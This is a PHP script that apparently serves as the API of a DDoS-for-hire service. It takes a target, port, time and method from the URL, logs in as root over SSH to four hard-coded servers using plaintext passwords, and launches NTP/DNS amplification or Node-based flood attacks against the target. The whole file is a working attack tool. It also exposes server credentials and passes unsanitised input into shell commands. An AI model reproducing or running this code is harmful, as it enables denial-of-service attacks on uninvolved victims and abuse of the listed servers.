<?php
    include('Net/SSH2.php');

    $address = "167.99.246.127"; //Server IP (If same server use localhost)

    $serverPort = 22; //SSH port (Default 22)
    
    $user = "root"; //User for the server
    
    $password = "corleapi13RE"; //Password for the server

    $address1 = "138.68.97.214"; //Server IP (If same server use localhost)

    $serverPort1 = 22; //SSH port (Default 22)
    
    $user1 = "root"; //User for the server
    
    $password1 = "corleapi13RE"; //Password for the server

    $address2 = "46.101.151.95"; //Server IP (If same server use localhost)

    $serverPort2 = 22; //SSH port (Default 22)
    
    $user2 = "root"; //User for the server
    
    $password2 = "corleapi13RE"; //Password for the server

    $address3 = "41.216.182.227"; //Server IP (If same server use localhost)

    $serverPort3 = 22; //SSH port (Default 22)
    
    $user3 = "root"; //User for the server
    
    $password3 = "corleapi13121312"; //Password for the server
    
    $Methods = array("CE-RAW", "CE-MIX", "CE-CF", "stop"); //Array of methods

    $APIKey = "corleapi"; //Your API Key

    $host = $_GET["host"];
    $port = intval($_GET['port']);
    $time = intval($_GET['time']);
    $method = $_GET["method"];

    $key = $_GET["key"];

    if (empty($host) | empty($port) | empty($time) | empty($method)) //Checking the fields
    {
        die("Please verify all fields");
    }

    if (!is_numeric($port) || !is_numeric($time)) 
    {
        die('Time and Port must be a number');
    }
  
    if (!filter_var($host, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4) && !filter_var($host, FILTER_VALIDATE_URL)) //Validating target
    {
        die('Please insert a correct IP address(v4)/URL..');
    }

    if($port < 1 && $port > 65535) //Validating port
    {
        die("Port is invalid");
    }

    if ($time < 1) //Validating time
    {
        die("Time is invalid");
    }

    if (!in_array($method, $Methods)) //Validating method
    {
        die("Method is invalid");
    }
    
    if ($key !== $APIKey) //Validating API Key
    { 
        die("Invalid API Key");
    }

    $connection = ssh2_connect($address, $serverPort);
    if(ssh2_auth_password($connection, $user, $password))
    {
        if($method == "NTP"){if(ssh2_exec($connection, "screen -dm -S $host timeout $time ./NTP $host $port ntp.list 2 300000 $time")){echo "Attack sent to $host for $time seconds using $method!";}else{die("Ran into a error");}}
        if($method == "DNS"){if(ssh2_exec($connection, "screen -dm -S $host timeout $time ./DNS $host $port dns.list 2 300000 $time")){echo "Attack sent to $host for $time seconds using $method!";}else{die("Ran into a error");}}
        if($method == "CE-RAW"){if(ssh2_exec($connection, "screen -dm timeout $time node CE-RAW.js $host $time")){echo "Attack sent to $host for $time seconds using $method!";}else{die("Ran into a error");}}
        if($method == "CE-CF"){if(ssh2_exec($connection, "screen -dm timeout $time node CE-CF.js $host $time")){echo "Attack sent to $host for $time seconds using $method!";}else{die("Ran into a error");}}
        if($method == "CE-MIX"){if(ssh2_exec($connection, "screen -dm timeout $time node CE-CF.js $host $time")){echo "Attack sent to $host for $time seconds using $method!";}else{die("Ran into a error");}}
        if($method == "stop"){if(ssh2_exec($connection, "pkill -f $host")){echo "Attack stopped on $host!";}else{die("Ran into a error");}}      
    }

    $connection = ssh2_connect($address1, $serverPort1);
    if(ssh2_auth_password($connection, $user1, $password1))
    {
        if($method == "NTP"){if(ssh2_exec($connection, "screen -dm -S $host timeout $time ./NTP $host $port ntp.list 2 300000 $time")){echo "Attack sent to $host for $time seconds using $method!";}else{die("Ran into a error");}}
        if($method == "DNS"){if(ssh2_exec($connection, "screen -dm -S $host timeout $time ./DNS $host $port dns.list 2 300000 $time")){echo "Attack sent to $host for $time seconds using $method!";}else{die("Ran into a error");}}
        if($method == "CE-RAW"){if(ssh2_exec($connection, "screen -dm timeout $time node CE-RAW.js $host $time")){echo "Attack sent to $host for $time seconds using $method!";}else{die("Ran into a error");}}
        if($method == "CE-CF"){if(ssh2_exec($connection, "screen -dm timeout $time node CE-CF.js $host $time")){echo "Attack sent to $host for $time seconds using $method!";}else{die("Ran into a error");}}
        if($method == "CE-MIX"){if(ssh2_exec($connection, "screen -dm timeout $time node CE-CF.js $host $time")){echo "Attack sent to $host for $time seconds using $method!";}else{die("Ran into a error");}}
        if($method == "stop"){if(ssh2_exec($connection, "pkill -f $host")){echo "Attack stopped on $host!";}else{die("Ran into a error");}}      
    }

    $connection = ssh2_connect($address2, $serverPort2);
    if(ssh2_auth_password($connection, $user2, $password2))
    {
        if($method == "NTP"){if(ssh2_exec($connection, "screen -dm -S $host timeout $time ./NTP $host $port ntp.list 2 300000 $time")){echo "Attack sent to $host for $time seconds using $method!";}else{die("Ran into a error");}}
        if($method == "DNS"){if(ssh2_exec($connection, "screen -dm -S $host timeout $time ./DNS $host $port dns.list 2 300000 $time")){echo "Attack sent to $host for $time seconds using $method!";}else{die("Ran into a error");}}
        if($method == "CE-RAW"){if(ssh2_exec($connection, "screen -dm timeout $time node CE-RAW.js $host $time")){echo "Attack sent to $host for $time seconds using $method!";}else{die("Ran into a error");}}
        if($method == "CE-CF"){if(ssh2_exec($connection, "screen -dm timeout $time node CE-CF.js $host $time")){echo "Attack sent to $host for $time seconds using $method!";}else{die("Ran into a error");}}
        if($method == "CE-MIX"){if(ssh2_exec($connection, "screen -dm timeout $time node CE-CF.js $host $time")){echo "Attack sent to $host for $time seconds using $method!";}else{die("Ran into a error");}}
        if($method == "stop"){if(ssh2_exec($connection, "pkill -f $host")){echo "Attack stopped on $host!";}else{die("Ran into a error");}}      
    }

    $connection = ssh2_connect($address3, $serverPort3);
    if(ssh2_auth_password($connection, $user3, $password3))
    {
        if($method == "NTP"){if(ssh2_exec($connection, "screen -dm -S $host timeout $time ./NTP $host $port ntp.list 2 300000 $time")){echo "Attack sent to $host for $time seconds using $method!";}else{die("Ran into a error");}}
        if($method == "DNS"){if(ssh2_exec($connection, "screen -dm -S $host timeout $time ./DNS $host $port dns.list 2 300000 $time")){echo "Attack sent to $host for $time seconds using $method!";}else{die("Ran into a error");}}
        if($method == "CE-RAW"){if(ssh2_exec($connection, "screen -dm timeout $time node CE-RAW.js $host $time")){echo "Attack sent to $host for $time seconds using $method!";}else{die("Ran into a error");}}
        if($method == "CE-CF"){if(ssh2_exec($connection, "screen -dm timeout $time node CE-CF.js $host $time")){echo "Attack sent to $host for $time seconds using $method!";}else{die("Ran into a error");}}
        if($method == "CE-MIX"){if(ssh2_exec($connection, "screen -dm timeout $time node CE-CF.js $host $time")){echo "Attack sent to $host for $time seconds using $method!";}else{die("Ran into a error");}}
        if($method == "stop"){if(ssh2_exec($connection, "pkill -f $host")){echo "Attack stopped on $host!";}else{die("Ran into a error");}}      
    }
    else
    {
        die("Could not login to remote server, this may be a error with the login credentials.");
    }
?>